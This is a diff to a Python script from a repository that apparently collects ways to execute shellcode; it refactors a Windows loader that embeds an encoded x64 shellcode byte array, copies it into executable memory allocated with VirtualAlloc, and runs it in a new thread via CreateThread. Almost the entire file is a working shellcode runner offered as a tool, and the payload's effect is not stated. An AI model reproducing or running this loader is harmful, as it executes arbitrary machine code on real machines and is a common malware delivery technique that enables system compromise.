@@ -25,7 +25,7 @@ This repository implements multiples way to execute
 shellcode with different platforms, systems and languages.
 """
 
-__version__ = "0.0.1"
+__version__ = "0.1.0"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -50,7 +50,9 @@ __all__ = []
 
 print(copyright)
 
-import ctypes
+from ctypes import windll, c_void_p, c_char
+
+kernel32 = windll.kernel32
 
 shellcode = bytearray(
     b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d"
@@ -81,26 +83,23 @@ shellcode = bytearray(
     b"\x29\x82\x14\x09\xe6\x8e\x2d\xe9\x1c\xa0\xb3\xb6"
     b"\x61\x3e\x4e\x88\x70\xc3\x9d"
 )
+shellcode_length = len(shellcode)
 
-ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
-ptr = ctypes.windll.kernel32.VirtualAlloc(
-    ctypes.c_ulonglong(0),
-    ctypes.c_ulonglong(len(shellcode)),
-    ctypes.c_ulonglong(0x3000),
-    ctypes.c_ulonglong(0x40),
+kernel32.VirtualAlloc.restype = c_void_p
+shellcode_pointer = kernel32.VirtualAlloc(
+    None,
+    shellcode_length,
+    0x3000,
+    0x40,
 )
-buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
-ctypes.windll.kernel32.RtlMoveMemory(
-    ctypes.c_ulonglong(ptr), buf, ctypes.c_ulonglong(len(shellcode))
+shellcode_buffer = (c_char * shellcode_length).from_buffer(shellcode)
+kernel32.RtlMoveMemory(c_void_p(shellcode_pointer), shellcode_buffer, shellcode_length)
+thread_handle = kernel32.CreateThread(
+    None,
+    0,
+    c_void_p(shellcode_pointer),
+    None,
+    0,
+    None,
 )
-ht = ctypes.windll.kernel32.CreateThread(
-    ctypes.c_ulonglong(0),
-    ctypes.c_ulonglong(0),
-    ctypes.c_ulonglong(ptr),
-    ctypes.c_ulonglong(0),
-    ctypes.c_ulonglong(0),
-    ctypes.pointer(ctypes.c_ulonglong(0)),
-)
-ctypes.windll.kernel32.WaitForSingleObject(
-    ctypes.c_ulonglong(ht), ctypes.c_ulonglong(-1)
-)
+kernel32.WaitForSingleObject(thread_handle, -1)
